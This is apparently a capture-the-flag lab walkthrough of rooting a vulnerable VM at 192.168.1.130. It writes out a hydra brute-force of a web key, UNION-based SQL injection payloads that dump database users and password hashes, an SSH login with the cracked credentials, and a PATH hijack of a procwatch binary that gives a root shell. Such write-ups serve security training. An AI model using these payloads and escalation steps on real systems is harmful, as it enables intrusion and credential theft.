**Enumeration**
netdiscover -r 192.168.1.0/24

![[netdiscover find ip.png]]

Attacker : 192.168.1.128
Target   : 192.168.1.130

scan service and version target
nmap -sV 192.168.1.130

![[nmap.png]]

ssh port not defalut use port 777

**Web Enumeration**
http://192.168.1.130
website has only 1 pic

![[web 1.png]]


source code and inspect element not found hint
then inspect metadata pic

wget http://192.168.1.130/main.gif
use exiftool main.gif

![[exiftool pic.png]]

found comment : P- ): kzMb5nVYJw

try http://192.168.1.130/kzMb5nVYJw

![[web2.png]]
source code and inspect element found hint key not complex

![[web2inspect.png]]

![[web2burp.png]]

**Brute Force**
then brute force with hydra

hydra -l user -P /usr/share/wordlists/rockyou.txt \
192.168.1.130 http-form-post \
"/kzMb5nVYJw/index.php:key=^PASS^:invalid key"

![[web2bruteForce.png]]

key = elite
after send key = elite

![[web3.png]]

inspect website
![[web3source.png]]

try to form action
![[web3action.png]]

try to sent parameter
420search.php?usrtosearch="

![[web3sql.png]]

response = SQL syntax error near '%"'
and database is MySQL

**SQL Injection**
send : "--
![[web3sql2.png]]

send: "--+(+ is spacebar)
![[web3sql3.png]]
after add spacebar -- is comment

send: " union select "1"; --+(+is spaceBar)

![[web3numberColumn.png]]reponse : different number of columns

send: " union select "1","2","3"; --+(+is spaceBar)

![[web3numberColumn2.png]]

fetched data successfully can join 3 column

**Database Enumeration**

send: " union select user(),@@version,database(); --+(+is spaceBar)

![[web3findUserVersionDatabase.png]]

user = root@localhost
database version= 5.5.44-0+deb8u1
database name = seth

send: " union select schema_name,"2","3" from information_schema.schemata; --+(+is spaceBar)

for find all database name

![[web3findAllDatabase.png]]

for find table name

send: " union select table_schema,table_name,"3" from information_schema.tables where table_schema='seth'; --+(+is spaceBar)

![[web3findTableInDatabase='seth'.png]]table_schema = database -> seth
table_name = users

send: " union select table_schema,column_name,"3" from information_schema.columns where table_name='users'; --+(+is spaceBar)

![[web3findColumnInTable=users.png]]database = seth
table = users
column = id,user,pass,position

and then 
send: " union select user,pass,concat(id," ",position) from users; --+(+คือ spaceBar)

for dump data in database=seth,table=users

![[web3findUserPass.png]]
now have user and password but password is encoding
use hashes.com for decode

![[hash1.png]]

![[hash2.png]]

found pass = omxxx

**Credential Access**

from nmap ssh at port 777
user=ramses
pass= omxxx

![[ssh.png]]

now user is ramses not root

**Privilege Escalation**

ls -la

for find all files

cat .bash_history 

for read all command in history

![[ls -la.png]]

go to path procwatch

![[goToPathProcwatch.png]]

run procwatch

![[runProcwatch.png]]

procwatch have run file sh and ps
create file shell ps

echo /bin/sh > ps
chmod 777 ps

![[createShellForProcwatch.png]]

echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

from ls -l
path /var/www is root permission

if want to run procwatch by root permission need to add /var/www/backup

**PATH hijack**

export PATH=/var/www/backup:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

![[exportPathForPrivilageEscalationByProcwatch.png]]

run procwatch with root permission

![[root.png]]